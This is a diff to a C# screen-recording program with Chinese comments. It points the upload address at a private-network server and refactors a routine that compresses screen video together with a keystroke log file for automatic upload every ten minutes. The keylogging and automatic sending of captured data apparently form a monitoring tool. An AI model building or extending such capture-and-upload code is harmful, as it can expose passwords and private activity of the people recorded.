@@ -29,7 +29,7 @@ namespace ScreenRecorder
         private int frameRate = 10; // 默认帧率
         private int frameCount = 0;
         private int videoQuality = 20; // 视频质量参数，范围0-100
-        private string remoteServerUrl = "http://localhost/upload"; // 远程存储服务器地址
+        private string remoteServerUrl = "http://192.168.79.28:5000/api/upload/file"; // 远程存储服务器地址
         private System.Timers.Timer? autoUploadTimer; // 自动上传定时器
         private DateTime lastAutoUploadTime; // 上次自动上传时间
         private int autoUploadIntervalMinutes = 10; // 自动上传间隔（分钟）
@@ -545,20 +545,23 @@ namespace ScreenRecorder
 
                 // 创建压缩文件路径
                 string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
-                string zipFilePath = Path.Combine(Path.GetDirectoryName(videoFilePath), "AutoUpload_ScreenCapture_" + timestamp + ".7z");
+                string? directory = Path.GetDirectoryName(videoFilePath);
+                string zipFilePath = directory != null ? Path.Combine(directory, "AutoUpload_ScreenCapture_" + timestamp + ".7z") : "AutoUpload_ScreenCapture_" + timestamp + ".7z";
 
                 // 准备文件列表
-                List<string> filesToCompress = new List<string> { videoFilePath };
+                List<string> filesToCompress = new() { videoFilePath };
                 if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
                 {
                     filesToCompress.Add(keylogFilePath);
                 }
 
                 // 创建SevenZipCompressor实例并设置最大压缩率
-                SevenZipCompressor compressor = new SevenZipCompressor();
-                compressor.CompressionLevel = SevenZip.CompressionLevel.Ultra;
-                compressor.CompressionMethod = SevenZip.CompressionMethod.Lzma2;
-                compressor.CompressionMode = SevenZip.CompressionMode.Create;
+                SevenZipCompressor compressor = new()
+                {
+                    CompressionLevel = SevenZip.CompressionLevel.Ultra,
+                    CompressionMethod = SevenZip.CompressionMethod.Lzma2,
+                    CompressionMode = SevenZip.CompressionMode.Create
+                };
 
                 // 不显示进度窗口，直接压缩
                 compressor.CompressFiles(zipFilePath, filesToCompress.ToArray());
